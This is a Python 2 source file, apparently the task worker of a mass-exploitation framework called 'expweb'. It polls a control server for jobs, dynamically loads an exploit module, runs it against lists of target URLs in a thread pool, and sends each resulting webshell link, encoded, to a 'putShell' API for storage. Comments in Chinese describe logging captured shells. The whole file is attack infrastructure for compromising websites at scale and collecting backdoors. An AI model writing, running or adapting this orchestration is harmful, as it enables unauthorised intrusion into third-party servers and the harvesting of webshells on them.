# coding:utf-8
import tools,urllib,sys,re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from dummy import *

#shell入库
#url web服务端接口
#shell webshell链接
#checkurl webshell url
def putShell(nodeurl,shell,project_hash):
    if shell:
            son = '{"project_hash":"'+project_hash+'","url":"'+shell+'"}'
            encdata = tools.data_encode(son,tools.key)
            list = []
            code,head,res,errcode,_ = curl.curl(nodeurl + 'expweb/index.php?m=api&a=putShell&myshell='+urllib.quote(encdata))
            if code == 200:
                m = re.search('520e06cc0600762016cd277c7e6282e0', res)
                if m:
                    print '[ok]'
            else:
                print '[faild]'

#任务完成 改变任务状态
def putStatus():
    curl = miniCurl.Curl()
    code,head,res,errcode,_ = curl.curl('http://127.0.0.1/expweb/index.php?m=api&a=proStatus&token='+urllib.quote(project_hash))
    if code == 200:
        m = re.search('ok', res)
        if m:
            print '[status.ok]'
        else:
            print '[status.faild]'
                        
pool = ThreadPool()#创建线程池
#实例化对象
tools = tools.Tools() 

while 1:
    #tasklist = tools.getTask('http://localhost/')#获取任务字典
    tasklist = tools.getTask('http://127.0.0.1/')#获取任务字典
    if tasklist != 'notask':
        print '===========================Task start=========================='
        project_hash = tasklist['project_hash'] #获取项目hash
        exp = __import__(tasklist['0']) #动态加载exp
        exp.curl = miniCurl.Curl()#每次让exp 创建一个新的curl对象
        #print tasklist['target']
        urls = tools.getAllUrl(tasklist['target']) #处理目标url参数为字典
        #print urls
        #exit(0)
        results = pool.map(exp.test, urls) #start
        for index  in results:
            if not index is None:
                sys.stdout.write(index)
                putShell('http://127.0.0.1/',index,project_hash)
        putStatus()
        print '===========================Task end============================'
        
    else:
        #print 'notask'
        sys.stdout.write('listen...\r')
